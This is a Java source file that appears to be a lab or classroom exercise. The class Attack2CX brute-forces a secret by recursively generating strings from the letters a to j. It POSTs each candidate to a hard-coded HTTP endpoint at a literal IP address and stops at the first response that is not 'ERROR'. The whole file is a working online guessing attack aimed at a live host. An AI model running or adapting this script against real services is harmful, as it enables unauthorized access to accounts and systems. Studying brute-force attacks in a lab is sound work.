package post;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;

public class Attack2CX {
	public boolean ejecutar=false;
	public String response="Failed Attack";
	public String At(String base, int ancho, int longmax) throws ClientProtocolException, IOException {
		String newBase="";
		if(ancho>longmax){
			return "Ancho superior a la longitud maxima";
		}
		for(int i=97;i<=106;i++){	
			newBase=base+(char)i;
			if(check(newBase)){
				response=newBase;
				ejecutar=true;
			}
			else if(ejecutar==false){
				At(newBase, ancho+1,longmax);
			}
		}
		return response;
	}
	
	public Boolean check(String result) throws ClientProtocolException, IOException{
		CloseableHttpClient client = HttpClients.createDefault();
        HttpPost httpPost = new HttpPost("http://35.161.4.173:8080/test4/rservice/accountservice/metodopost");
	    List<NameValuePair> params = new ArrayList<NameValuePair>();
	    params.add(new BasicNameValuePair("version", "user"));
	    params.add(new BasicNameValuePair("Data", result));
	    httpPost.setEntity(new UrlEncodedFormEntity(params));
	    CloseableHttpResponse response = client.execute(httpPost);
		BufferedReader rd = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
		String line = "";
		while ((line = rd.readLine()) != null) {
			System.out.println(result+" : "+line);
			if(!line.equals("ERROR")){
				return true;
            }
 		}
		return false;
	}
}